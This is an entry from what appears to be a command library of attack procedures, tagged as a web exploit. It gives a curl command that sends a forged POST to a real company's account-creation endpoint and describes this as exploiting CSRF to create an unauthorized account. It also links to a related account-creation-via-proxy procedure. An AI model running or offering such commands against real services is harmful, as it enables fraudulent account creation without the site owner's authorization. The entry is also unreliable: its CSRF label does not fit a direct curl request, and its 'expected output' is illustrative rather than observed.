---
data: >-
  curl -X POST
  'https://auto-api.yelp.com/account/create_secure?time=1234567890&nonce=abc123&ywsid=def456&device_type=web&app_version=1.0&cc=US&lang=en&efs=1&signature=xyz789'
  -H 'Content-Type: application/x-www-form-urlencoded' -d
  'first_name=Test1&last_name=Test2&email=test@example.com&password=123123qq&user_country_code=AR&city=12333&confirmed=0'
tags:
  - csrf
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:36.049Z'
id: deed71f3-aac3-47a4-a274-43186c408772
verified: false
validated: true
submitted: true
---
# curl-post-csrf-signup

## Command

```bash
curl -X POST 'https://auto-api.yelp.com/account/create_secure?time=1234567890&nonce=abc123&ywsid=def456&device_type=web&app_version=1.0&cc=US&lang=en&efs=1&signature=xyz789' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'first_name=Test1&last_name=Test2&email=test@example.com&password=123123qq&user_country_code=AR&city=12333&confirmed=0'
```

## Description

This curl command sends a forged POST request to Yelp's signup endpoint to exploit CSRF and create an unauthorized account. Use it to test vulnerability without browser protections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| URL with query params | Endpoint and params like time, nonce, etc. | Yes |
| `-H 'Content-Type: ...'` | Sets form-encoded content type | Yes |
| `-d '...'` | Form data payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://auto-api.yelp.com/account/create_secure?...' -H 'Content-Type: application/x-www-form-urlencoded' -d 'first_name=Test1&...'
```

### Advanced Usage

Add `-v` for verbose output:

```bash
curl -v -X POST 'https://auto-api.yelp.com/account/create_secure?...' -H 'Content-Type: application/x-www-form-urlencoded' -d 'first_name=Test1&...'
```

## Expected Output

JSON response indicating success, e.g., {"user_id": 12345, "email": "test@example.com", "status": "created"}. Failure may return error if params invalid.

## Related

- [[Related Procedure: Execute-CSRF-Account-Creation-via-Proxy]]
